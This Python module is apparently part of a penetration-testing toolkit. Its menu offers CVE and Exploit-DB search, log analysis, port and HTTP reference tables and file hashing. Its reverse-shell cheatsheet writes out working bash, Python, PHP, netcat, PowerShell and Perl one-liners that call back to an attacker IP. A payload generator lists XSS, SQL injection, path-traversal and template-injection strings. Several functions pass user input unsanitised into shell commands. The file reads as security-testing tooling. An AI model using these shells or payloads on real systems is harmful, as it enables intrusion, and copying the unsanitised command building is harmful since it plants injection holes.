"""
Utility Tools - CVE Search, Screenshot, Log Analysis, etc.
"""

import os
import sys
import re
import json
from datetime import datetime
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.colors import *
from utils.helpers import *

class UtilityTools:
    def __init__(self):
        self.output_dir = create_output_dir("output/utils")
    
    def show_menu(self):
        while True:
            clear_screen()
            print(f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗
║                    UTILITY TOOLS                             ║
╠══════════════════════════════════════════════════════════════╣{Colors.END}
║   {Colors.CYAN}[1]{Colors.END}  CVE Search                                         ║
║   {Colors.CYAN}[2]{Colors.END}  Exploit-DB Search                                  ║
║   {Colors.CYAN}[3]{Colors.END}  Web Screenshot (gowitness)                         ║
║   {Colors.CYAN}[4]{Colors.END}  Log Analyzer                                       ║
║   {Colors.CYAN}[5]{Colors.END}  IP/Domain Info                                     ║
║   {Colors.CYAN}[6]{Colors.END}  Reverse Shell Cheatsheet                           ║
║   {Colors.CYAN}[7]{Colors.END}  Port Reference                                     ║
║   {Colors.CYAN}[8]{Colors.END}  HTTP Status Codes                                  ║
║   {Colors.CYAN}[9]{Colors.END}  Payload Generator                                  ║
║   {Colors.CYAN}[10]{Colors.END} File Analyzer                                      ║
║   {Colors.RED}[0]{Colors.END}  Back                                               ║
{Colors.CYAN}╚══════════════════════════════════════════════════════════════╝{Colors.END}
            """)
            choice = get_input("  Select")
            if choice == "0": break
            elif choice == "1": self.cve_search()
            elif choice == "2": self.exploitdb_search()
            elif choice == "3": self.web_screenshot()
            elif choice == "4": self.log_analyzer()
            elif choice == "5": self.ip_info()
            elif choice == "6": self.revshell_cheat()
            elif choice == "7": self.port_reference()
            elif choice == "8": self.http_codes()
            elif choice == "9": self.payload_gen()
            elif choice == "10": self.file_analyzer()

    def cve_search(self):
        clear_screen()
        print(f"\n{Colors.BOLD}  CVE SEARCH{Colors.END}\n")
        query = get_input("  Search (product, CVE-ID, keyword)")
        if not query: return
        
        print_info(f"\n  Searching for: {query}\n")
        
        # Use cve.circl.lu API
        if query.upper().startswith("CVE-"):
            url = f"https://cve.circl.lu/api/cve/{query.upper()}"
            stdout, _, _ = run_command(f"curl -s '{url}'")
            try:
                data = json.loads(stdout)
                if data:
                    print(f"  {Colors.CYAN}CVE ID:{Colors.END} {data.get('id', 'N/A')}")
                    print(f"  {Colors.CYAN}Summary:{Colors.END} {data.get('summary', 'N/A')[:200]}...")
                    print(f"  {Colors.CYAN}CVSS:{Colors.END} {data.get('cvss', 'N/A')}")
                    print(f"  {Colors.CYAN}Published:{Colors.END} {data.get('Published', 'N/A')}")
                    refs = data.get('references', [])[:5]
                    if refs:
                        print(f"  {Colors.CYAN}References:{Colors.END}")
                        for r in refs: print(f"    - {r}")
            except:
                print_error("  Failed to parse response")
        else:
            url = f"https://cve.circl.lu/api/search/{query}"
            stdout, _, _ = run_command(f"curl -s '{url}' | head -c 5000")
            try:
                data = json.loads(stdout)
                if data:
                    print(f"  Found {len(data)} results:\n")
                    for cve in data[:10]:
                        print(f"  {Colors.GREEN}{cve.get('id')}{Colors.END}")
                        print(f"    {cve.get('summary', 'N/A')[:80]}...")
                        print()
            except:
                print_warning("  No results or API error")
        
        input("\n  Press Enter...")

    def exploitdb_search(self):
        clear_screen()
        print(f"\n{Colors.BOLD}  EXPLOIT-DB SEARCH{Colors.END}\n")
        query = get_input("  Search term")
        if not query: return
        
        if check_tool("searchsploit"):
            run_command_live(f"searchsploit {query}")
        else:
            print_warning("  searchsploit not found")
            print_info(f"  Manual search: https://www.exploit-db.com/search?q={query}")
        
        input("\n  Press Enter...")

    def web_screenshot(self):
        clear_screen()
        print(f"\n{Colors.BOLD}  WEB SCREENSHOT{Colors.END}\n")
        
        if check_tool("gowitness"):
            mode = get_input("  [1] Single URL  [2] File list", "1")
            
            if mode == "1":
                url = get_input("  URL")
                if url:
                    run_command_live(f"gowitness single {url} -o {self.output_dir}")
            else:
                urlfile = get_input("  URL list file")
                if urlfile:
                    run_command_live(f"gowitness file -f {urlfile} -o {self.output_dir}")
            
            print_success(f"  Screenshots saved to: {self.output_dir}")
        
        elif check_tool("cutycapt"):
            url = get_input("  URL")
            outfile = f"{self.output_dir}/screenshot_{get_timestamp()}.png"
            run_command_live(f"cutycapt --url={url} --out={outfile}")
            print_success(f"  Saved: {outfile}")
        
        else:
            print_error("  No screenshot tool found!")
            print_info("  Install: apt install gowitness OR apt install cutycapt")
        
        input("\n  Press Enter...")

    def log_analyzer(self):
        clear_screen()
        print(f"\n{Colors.BOLD}  LOG ANALYZER{Colors.END}\n")
        logfile = get_input("  Log file path")
        if not logfile or not os.path.exists(logfile): 
            print_error("  File not found!"); input("\n  Enter..."); return
        
        print(f"\n  [1] Find IPs")
        print(f"  [2] Find URLs")
        print(f"  [3] Find Emails")
        print(f"  [4] Error lines")
        print(f"  [5] Custom regex")
        choice = get_input("\n  Select", "1")
        
        patterns = {
            "1": (r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', "IPs"),
            "2": (r'https?://[^\s<>"\']+', "URLs"),
            "3": (r'[\w\.-]+@[\w\.-]+\.\w+', "Emails"),
            "4": (r'.*(error|fail|exception|denied).*', "Errors"),
        }
        
        if choice == "5":
            pattern = get_input("  Regex pattern")
            name = "Custom"
        elif choice in patterns:
            pattern, name = patterns[choice]
        else:
            return
        
        print(f"\n  {Colors.BOLD}Searching for {name}...{Colors.END}\n")
        
        matches = set()
        with open(logfile, 'r', errors='ignore') as f:
            for line in f:
                found = re.findall(pattern, line, re.IGNORECASE)
                matches.update(found)
        
        if matches:
            print(f"  Found {len(matches)} unique matches:\n")
            for m in list(matches)[:50]:
                print(f"    {m}")
            if len(matches) > 50:
                print(f"    ... and {len(matches)-50} more")
            
            outfile = f"{self.output_dir}/log_analysis_{get_timestamp()}.txt"
            with open(outfile, 'w') as f:
                f.write('\n'.join(sorted(matches)))
            print_success(f"\n  Saved: {outfile}")
        else:
            print_warning("  No matches found")
        
        input("\n  Press Enter...")

    def ip_info(self):
        clear_screen()
        print(f"\n{Colors.BOLD}  IP/DOMAIN INFO{Colors.END}\n")
        target = get_input("  IP or Domain")
        if not target: return
        
        print_info("\n  Gathering information...\n")
        
        # IP Geolocation
        stdout, _, _ = run_command(f"curl -s 'http://ip-api.com/json/{target}'")
        try:
            data = json.loads(stdout)
            print(f"  {Colors.CYAN}Location:{Colors.END} {data.get('city')}, {data.get('country')}")
            print(f"  {Colors.CYAN}ISP:{Colors.END} {data.get('isp')}")
            print(f"  {Colors.CYAN}Org:{Colors.END} {data.get('org')}")
            print(f"  {Colors.CYAN}AS:{Colors.END} {data.get('as')}")
        except: pass
        
        # DNS
        print(f"\n  {Colors.CYAN}DNS Records:{Colors.END}")
        stdout, _, _ = run_command(f"dig {target} +short")
        if stdout.strip(): print(f"    A: {stdout.strip()}")
        
        stdout, _, _ = run_command(f"dig {target} MX +short")
        if stdout.strip(): print(f"    MX: {stdout.strip()[:50]}")
        
        input("\n  Press Enter...")

    def revshell_cheat(self):
        clear_screen()
        print(f"\n{Colors.BOLD}  REVERSE SHELL CHEATSHEET{Colors.END}\n")
        
        ip = get_input("  Your IP", "10.10.10.10")
        port = get_input("  Port", "4444")
        
        shells = f"""
  {Colors.CYAN}[Bash]{Colors.END}
  bash -i >& /dev/tcp/{ip}/{port} 0>&1
  
  {Colors.CYAN}[Python]{Colors.END}
  python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
  
  {Colors.CYAN}[PHP]{Colors.END}
  php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'
  
  {Colors.CYAN}[Netcat]{Colors.END}
  nc -e /bin/sh {ip} {port}
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f
  
  {Colors.CYAN}[PowerShell]{Colors.END}
  powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}}"
  
  {Colors.CYAN}[Perl]{Colors.END}
  perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
  
  {Colors.YELLOW}[Listener]{Colors.END}
  nc -lvnp {port}
  rlwrap nc -lvnp {port}
"""
        print(shells)
        
        outfile = f"{self.output_dir}/revshells_{get_timestamp()}.txt"
        with open(outfile, 'w') as f: f.write(shells)
        print_success(f"  Saved: {outfile}")
        input("\n  Press Enter...")

    def port_reference(self):
        clear_screen()
        print(f"\n{Colors.BOLD}  COMMON PORTS REFERENCE{Colors.END}\n")
        
        ports = """
  {c}TCP Ports:{e}
  21    FTP              22    SSH              23    Telnet
  25    SMTP             53    DNS              80    HTTP
  110   POP3             143   IMAP             443   HTTPS
  445   SMB              3306  MySQL            3389  RDP
  5432  PostgreSQL       5900  VNC              8080  HTTP-Alt
  
  {c}UDP Ports:{e}
  53    DNS              67    DHCP             69    TFTP
  123   NTP              161   SNMP             500   IKE
  
  {c}Web Servers:{e}
  80, 443, 8080, 8443, 8000, 8888, 9000, 9090
  
  {c}Databases:{e}
  3306 MySQL    5432 PostgreSQL    1433 MSSQL
  1521 Oracle   27017 MongoDB      6379 Redis
  
  {c}Windows:{e}
  135 RPC    139 NetBIOS    445 SMB    3389 RDP
  5985 WinRM  5986 WinRM-HTTPS
""".format(c=Colors.CYAN, e=Colors.END)
        
        print(ports)
        input("\n  Press Enter...")

    def http_codes(self):
        clear_screen()
        print(f"\n{Colors.BOLD}  HTTP STATUS CODES{Colors.END}\n")
        
        codes = f"""
  {Colors.GREEN}2xx Success:{Colors.END}
  200 OK              201 Created         204 No Content
  
  {Colors.CYAN}3xx Redirection:{Colors.END}
  301 Moved Permanently    302 Found    304 Not Modified
  
  {Colors.YELLOW}4xx Client Error:{Colors.END}
  400 Bad Request     401 Unauthorized    403 Forbidden
  404 Not Found       405 Method Not Allowed
  429 Too Many Requests
  
  {Colors.RED}5xx Server Error:{Colors.END}
  500 Internal Error  502 Bad Gateway     503 Service Unavailable
  504 Gateway Timeout
"""
        print(codes)
        input("\n  Press Enter...")

    def payload_gen(self):
        clear_screen()
        print(f"\n{Colors.BOLD}  PAYLOAD GENERATOR{Colors.END}\n")
        
        print(f"  [1] XSS Payloads")
        print(f"  [2] SQLi Payloads")
        print(f"  [3] LFI Payloads")
        print(f"  [4] SSTI Payloads")
        choice = get_input("\n  Select", "1")
        
        payloads = {
            "1": [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '"><script>alert(1)</script>',
                "'-alert(1)-'",
                '<svg onload=alert(1)>',
            ],
            "2": [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "1' AND '1'='1",
                "admin'--",
            ],
            "3": [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "/etc/passwd%00",
                "php://filter/convert.base64-encode/resource=index.php",
            ],
            "4": [
                "{{7*7}}",
                "${7*7}",
                "{{config}}",
                "{{self.__class__.__mro__}}",
            ]
        }
        
        if choice in payloads:
            print(f"\n  {Colors.BOLD}Payloads:{Colors.END}\n")
            for p in payloads[choice]:
                print(f"  {p}")
        
        input("\n  Press Enter...")

    def file_analyzer(self):
        clear_screen()
        print(f"\n{Colors.BOLD}  FILE ANALYZER{Colors.END}\n")
        filepath = get_input("  File path")
        if not filepath or not os.path.exists(filepath):
            print_error("  File not found!"); input("\n  Enter..."); return
        
        print_info(f"\n  Analyzing: {filepath}\n")
        
        # File type
        stdout, _, _ = run_command(f"file '{filepath}'")
        print(f"  {Colors.CYAN}Type:{Colors.END} {stdout.strip()}")
        
        # Size
        size = os.path.getsize(filepath)
        print(f"  {Colors.CYAN}Size:{Colors.END} {size} bytes")
        
        # Hashes
        import hashlib
        with open(filepath, 'rb') as f:
            data = f.read()
            print(f"  {Colors.CYAN}MD5:{Colors.END} {hashlib.md5(data).hexdigest()}")
            print(f"  {Colors.CYAN}SHA256:{Colors.END} {hashlib.sha256(data).hexdigest()}")
        
        # Strings (if available)
        if check_tool("strings"):
            if confirm("\n  Extract strings?"):
                stdout, _, _ = run_command(f"strings '{filepath}' | head -50")
                print(f"\n  {Colors.CYAN}Strings:{Colors.END}")
                print(stdout)
        
        input("\n  Press Enter...")
